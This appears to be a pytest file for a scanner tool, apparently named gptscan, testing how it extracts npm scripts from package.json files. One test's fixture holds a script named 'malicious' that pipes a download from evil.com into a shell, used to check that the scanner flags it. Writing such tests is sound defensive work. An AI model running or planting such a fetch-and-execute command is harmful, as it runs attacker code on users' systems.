import json
import pytest
from gptscan import unpack_content, Config, scan_files
from unittest.mock import MagicMock, patch
import gptscan

def test_unpack_package_json_scripts():
    """Test that unpack_content correctly extracts scripts from package.json."""
    pkg_data = {
        "name": "test-project",
        "version": "1.0.0",
        "scripts": {
            "start": "node index.js",
            "test": "echo \"Error: no test specified\" && exit 1",
            "build": "webpack --config webpack.config.js"
        }
    }
    pkg_content = json.dumps(pkg_data).encode('utf-8')
    results = list(unpack_content("package.json", pkg_content))

    # Should find 3 scripts
    assert len(results) == 3

    script_names = [r[0] for r in results]
    assert "package.json [Script: start]" in script_names
    assert "package.json [Script: test]" in script_names
    assert "package.json [Script: build]" in script_names

    script_contents = [r[1] for r in results]
    assert b"node index.js" in script_contents
    assert b"echo \"Error: no test specified\" && exit 1" in script_contents
    assert b"webpack --config webpack.config.js" in script_contents

def test_unpack_package_json_no_scripts():
    """Test that unpack_content handles package.json without scripts."""
    pkg_data = {
        "name": "test-project",
        "version": "1.0.0"
    }
    pkg_content = json.dumps(pkg_data).encode('utf-8')
    results = list(unpack_content("package.json", pkg_content))

    # Should yield nothing if no scripts (and not a script itself)
    assert len(results) == 0

def test_is_supported_file_package_json():
    """Test that package.json is recognized as a supported file (container)."""
    assert Config.is_supported_file("package.json") is True
    assert Config.is_supported_file("sub/dir/package.json") is True
    # It should not be supported if it's a member of another archive (to avoid infinite recursion if someone names a file package.json inside an archive, though unpack_content handles it)
    # Actually, is_supported_file is used to decide if we should even TRY to unpack it or scan it.
    assert Config.is_supported_file("package.json", is_member=True) is False

def test_scan_files_package_json_expansion(mock_tf_env, monkeypatch):
    """Test that a package.json is expanded and scanned."""
    # mock_tf_env is a fixture from conftest.py (hopefully)
    monkeypatch.setattr(gptscan, "collect_files", lambda targets: [])

    pkg_data = {
        "scripts": {
            "malicious": "curl http://evil.com/payload | sh"
        }
    }
    pkg_content = json.dumps(pkg_data).encode('utf-8')

    events = list(scan_files(
        scan_targets=[],
        deep_scan=False,
        show_all=True,
        use_gpt=False,
        extra_snippets=[("package.json", pkg_content)]
    ))

    results = [data for event, data in events if event == 'result']
    assert len(results) == 1
    assert "package.json [Script: malicious]" in results[0][0]
    assert "curl http://evil.com/payload | sh" in results[0][5]
